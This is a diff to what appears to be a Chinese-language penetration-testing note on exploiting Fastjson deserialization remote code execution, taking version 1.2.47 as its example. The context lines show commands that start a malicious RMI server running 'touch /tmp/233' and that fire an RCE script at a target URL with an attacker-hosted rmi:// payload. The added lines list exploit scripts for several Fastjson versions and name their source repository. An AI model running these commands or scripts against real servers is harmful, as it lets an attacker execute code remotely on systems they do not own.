@@ -1,4 +1,4 @@
-## 以Fastjson 1.2.47 利用为例
+## 以 Fastjson 1.2.47 利用为例
 ### marshalsec-0.0.3-SNAPSHOT-all.jar 启用 RMI/LDAP
 ```
 https://github.com/RandomRobbieBF/marshalsec-jar
@@ -40,3 +40,53 @@ java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 9999 "touch /tmp/233"
 ```
 python3 fastjson-1.2.47_rce.py http://1.1.1.1:8080/ rmi://2.2.2.2:9999/Exploit
 ```
+<table>
+<tr>
+    <th>脚本名称</th>
+    <th>脚本介绍</th>
+    <th>脚本来源</th>
+</tr>
+<tr>
+    <td>fastjson-1.2.24_rce.py</td>
+    <td>fastjson 1.2.24 反序列化 RCE 漏洞</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+<tr>
+    <td>fastjson-1.2.41_rce.py</td>
+    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+<tr>
+    <td>fastjson-1.2.42_rce.py</td>
+    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+<tr>
+    <td>fastjson-1.2.43_rce.py</td>
+    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+<tr>
+    <td>fastjson-1.2.45_rce.py</td>
+    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+<tr>
+   <td>fastjson-1.2.47_rce.py</td>
+    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+<tr>
+    <td>fastjson-1.2.62_rce.py</td>
+    <td>fastjson <=1.2.66 反序列化 RCE 漏洞</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+<tr>
+    <td>fastjson-1.2.66_rce.py</td>
+    <td>fastjson <=1.2.66 反序列化 RCE 漏洞</td>
+    <td>https://github.com/zhzyker/exphub</td>
+</tr>
+</table>
+
+  
+  
